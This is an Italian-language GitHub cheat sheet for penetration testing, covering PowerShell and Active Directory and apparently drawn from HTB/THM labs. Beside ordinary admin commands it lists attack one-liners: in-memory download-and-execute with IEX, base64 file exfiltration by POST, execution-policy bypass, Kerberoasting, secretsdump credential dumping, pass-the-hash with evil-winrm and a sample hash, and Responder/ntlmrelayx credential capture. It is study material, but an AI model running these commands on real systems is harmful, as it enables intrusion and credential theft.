# Lista Link  
[Comandi Powershell](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell)
<!-- spazio -->
   - [Comandi Powershell info generali PC](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-info-generali-pc)
   - [Download/Upload file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#downloadupload-file)
   - [Comandi ADS (Alternate Data Stream)](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#comandi-ads-alternate-data-stream)
   - [Comandi per i file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-per-i-file)
<!-- spazio -->
[Active Directory Pentest:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
   - [Comandi per enumerare le macchine a dominio con powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-per-enumerare-le-macchine-a-dominio-attraverso-powerview)
   - [Bloodhund settings](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#bloodhund-settings)
   - [Suite impacket e vari utilizzi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#suite-impacket-e-vari-utilizzi)
   - [Note pentest](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-pentest)
<!-- spazio -->
[Note:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note)
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)

### Comandi Powershell

    fl #per ricevere più output 
ES: 
_Get-Acl | fl_

    Get-Help <nome comando > -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
_Get-LocalUser John | Select-Object LastLogon output: 03/02/2019 5:48:32 PM_

    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
<!-- -->

ES:
_New-LocalUser -Name $User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)_

    New-LocalGroup #per creare un nuovo gruppo
ES:
_New-LocalGroup -Name $Group_

    Add-LocalGroupMember #aggiungi un utente ad un gruppo
ES:
_Add-LocalGroupMember -Group $Group -Member $User_

    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file, cartelle o modificare valori
<!-- spazio -->
    Start-service #per avviare un servizio
<!-- spazio -->
    Set-item #per modificare file, cartelle o modificare valori
<!-- spazio -->
ES:
_Start-service WinRM_
<!-- spazio -->
      Get-NetIPAddress #comando powershell per ottenere configurazione di rete
 <!-- spazio -->     

### Comandi per i File
<!-- spazio -->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES:
<!-- spazio -->
_(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)_
<!-- spazio -->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #dalla classe IO.FILE richiama WriteAllBytes che scrive i Bytes
<!-- spazio -->

### Comandi Powershell info generali PC  

    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task /tasklist
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.
<!-- spazio -->  
    Get-ADDomain #per prendere tutte le informazione dell'AD Domain

### Download/Upload File
__Download:__
<!-- spazio -->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #semplice donwload
 <!--spazio -->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#download async cioè senza bloccare il calling thread
 <!--spazio -->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #Bypassing controllo certificato 
 <!--spazio -->
_possiamo trasferire un file senza dovre scaricare uno script ma runnarlo direttamente in memoria:_ 
 <!-- spazio -->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) # tramite IEX(Invoke-Expression) runniamo direttamentei in memoria
 <!-- spazio -->
 __Upload__
  <!-- spazio -->
 __N.B importante e avviare un server upload che riceva i file.__
  <!-- spazio -->
 _Comandi per avviare un server upload python e comandi powershell per inviare:_
 <!-- spazio -->
      pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
<!-- spazio -->
      python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
<!-- spazio -->
 _Ci sono 2 metodologie di download che cambiano in base ai permessi che abbiamo:_ 
 <!-- spazio -->
 - 1 se abbiamo possibilita di scaricare da internet possiamo utilizzare questi comandi:
 <!-- spazio -->
         IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') #comando per                  scaricare e poi avviare lo script
 <!-- spazio -->
         Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare>  #comando dello script per fare upload
 <!-- spazio -->
 - 2 se non abbiamo possibilità di scaricare da internet ma siamo collegati tramite VPN (HTB o THM) possiamo importare il .ps1 che permette l'upload e poi
      runnare lo script:
 <!-- spazio -->
         . .\PSUpload.ps1 #comando per avviare lo script
<!-- spazio -->
         Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script per fare upload
 <!-- spazio -->
_Upload tramite encoding in base64:_ 
<!-- spazio -->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!-- spazio -->      
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
<!-- spazio -->
_SMB_
_Comando per avviare il server SMB per l'upload:_ 
 <!-- spazio -->
      sudo impacket-smbserver <Nome share da inserire nel comando di upload> -smb2support <share locale che condividi>
<!-- spazio -->
      copy <path del file da copiare>  \\<ip target>\<nome share a cui accedere> #comando per fare upload, facendo una copia sul server SMB upload
<!-- spazio -->
      net use n: \\<ip target>\share /user:test test #fare il mount da di un SMB su una windows machine
<!-- spazio -->
    
### comandi ADS (alternate data stream)
<!-- -->
_Utili per gestire risorse ADS_

      Get-Item -path <path> -stream * #ottiene tutti gli ADS (alternate datastream di un file)
<!-- -->
      set-content -path <path del file> -stream <nome del nuovo stream> #crea un nuovo ADS e apre un terminale in cui è possibile scrivere il nuovo ADS
<!-- -->
      gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #cerca in tutto il filesystem la presenza  di ADS
<!-- -->
      remove-item –path <path al file> –stream <nome stream da rimuovere> #rimuove lo stream su un determinato file
<!-- -->

# Active Directory Pentest

_comandi SMB:_
<!-- spazio -->

    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->

    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->

    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->
_enumerazione del DC:_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->

    enum4linux <ip> #enumerazione
    
_enumerazione utenti:_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->

    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->

    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti:_
<!-- spazio -->

    impacket-GetNPUsers VULNNET-RST/t-skid -no-pass #funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali:_
<!-- spazio -->

    impacket-secretsdump -dc-ip 10.10.208.78 a-whitehat:bNdKVkjv3RR9ht@10.10.208.78 #recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine:_
<!-- spazio -->

    evil-winrm -i 10.10.113.15 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->

_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
<!-- spazio -->
    sudo responder -I <interfaccia di rete>
<!-- spazio -->
### Comandi per enumerare le macchine a dominio (attraverso PowerView)

_Scaricare PowerView.ps1 sulla macchina e avviarlo:_
<!-- spazio -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- spazio -->
_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:_

    Get-NetUser #ottiene le informazioni sugli utenti

<!-- spazio -->

    Get-NetUser | select cn #per ottenere solo il common name

<!-- spazio -->

    Get-NetGroup    #ottiene tutti i gruppi presenti a dominio

<!-- spazio -->

    Get-NetGroup -GroupName *admin*    #ottiene tutti i gruppi in cui è presente la parola admin

<!-- spazio -->

    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio

<!-- spazio -->

    Get-NetComputer -FullData    #ottiene tutte le informazioni su tutti i pc della rete

<!-- spazio -->

    Get-NetComputer -FullData | Select-Object logoncount    #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi    
### Bloodhund settings

__Bloodhound è un tool che permette l'organizazione delle informazioni ottenute dalla fase di recognition del'AD e domini Windows__

__Abbiamo bisogno di due tools: bloodhound e neo4j (che farà da database per bloodhound)__

      sudo apt install neo4j && sudo apt install bloodhound
<!-- -->

      neo4j console #apriamo la console di neo4j per startare il db
<!-- -->
_Dobbiamo navigare sull'interfaccia web di neo4j per loggare e cambiare la password di default.
Cerchiamo perciò http://localhost:7474/ e logghiamo con le credenziali di default (neo4j:neo4j)
e inseriamo la nostra nuova password._
<!-- -->
_Avviamo adesso bloodhound:_

      bloodhound

<!-- -->
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando
(lo script powershell deve essere ovviamente già sulla macchina)_

      . .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -JSONFolder "c:\experiments\bloodhound"
<!-- -->
_adesso scarichiamo il file sulla nostra macchina;
una volta fatto questo andiamo sull'interfaccia grafica di bloodhound e importiamo il file strisciandocelo sopra oppure selezionando l'icona importa mappa._

### Suite impacket e vari utilizzi:
_in questa sezione vengono spiegati cosa e come funzionano i vari tool della suite Impacket._
<!-- -->
      impacket-GetUserSPNs #sfrutta la vulnerabilita di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi
ES:
<!-- -->
impacket-GetUserSPNs <nome_dominio>/<user>:<password> -dc-ip <ip \domain_controller> -request
<!-- -->
      impacket-GetNPUsers  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza             richiedere la password
<!-- -->
ES:
<!-- -->
impacket-GetNPUsers <nome_dominio>/<nome_account> -no-pass
<!-- -->
      impacket-secretsdump #recupera NTDS.DIt, SAM hashes locali
<!-- -->
ES:
<!-- -->
impacket-secretsdump -dc-ip <ip_del_domain_controller> <nome \account>:<passoword>@<ip_domain_controller> 
<!-- -->     
      impacket-ntlmrelayx #ruba le credenziali NTLM quando vengono inviate tra utenti
<!-- -->
ES:
<!-- -->
impacket-ntlmrelayx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory_dove_salvare> 
<!-- -->
      impacket-addcomputer #comando per aggiungere un computer a dominio
ES:
<!-- -->
impacket-addcomputer -dc-ip <domain_controller_ip> -computer-name <nome_computer> -computer-pass '<password>' '<nome_tdl_dominio>/<username>:<password>'
<!-- -->

### Note Pentest
_WebDav protocollo che estende HTTP per la connessione in remoto._
_DavWWWRoot è una parola speciale riconosciuta dalla windows shell, utilizzata quando si vuole connettere ad un WebDav server, questa parola
specifica di voler connettersi alla root del server._
_SPN(Service Principal Name) sono identificatori nell'AD per identificare dei servizi o risorse come un server SQL._

# Note

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_
_Get-WmiObject #comando per ottenere oggetti fisici o logici gestibili dal WMi, insiemi a lui di solito va specificato la __-Class__ cioè la classe da recuperare._

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_Wmi è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer quindi per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

_MMC(Microsoft managment console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WSL(WIndows subsystem linux) un vero sottosistema che simula l'utilizzo di una shell linux, si installa con questo comando:
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux_

_BitsAdmin è uno strumento della riga di comando di Windows utilizzato per gestire il servizio Background Intelligent Transfer Service (BITS). 
BITS è un servizio di Windows che consente il trasferimento asincrono di file su Internet o in una rete locale._

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_UAC(User Access ControlL) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore._

_AppLocker permette un controllo granulare di script e dll, permette di aggiungere delle regole sempre su di loro._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._
